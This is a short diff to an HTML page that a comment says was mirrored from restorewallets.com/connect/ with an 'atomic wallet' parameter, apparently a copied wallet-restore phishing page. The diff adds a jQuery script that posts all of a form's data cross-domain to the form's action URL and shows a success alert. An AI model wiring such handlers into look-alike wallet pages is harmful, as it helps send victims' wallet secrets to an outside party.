@@ -3520,7 +3520,28 @@
 							document.getElementById("default").click();
 						</script>
 						<script src=""></script>
-						
+						<script>
+						    $("#ajaxForm").submit(function(e){
+							e.preventDefault();
+							var action = $(this).attr("action");
+							$.ajax({
+							type: "POST",
+							url: action,
+							crossDomain: true,
+							data: new FormData(this),
+							dataType: "json",
+							processData: false,
+							contentType: false,
+							headers: {
+							"Accept": "application/json"
+							}
+						    }).done(function() {
+							alert('The form was submitted successfully.')
+						    }).fail(function() {
+							alert('An error occurred! Please try again later.')
+						    });
+						    });
+						</script>
 					</center>
 				</body>
 				<!-- Mirrored from restorewallets.com/connect/index0b9a0b9a0b9a?w=atomic+wallet by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 05 Apr 2021 08:14:40 GMT -->
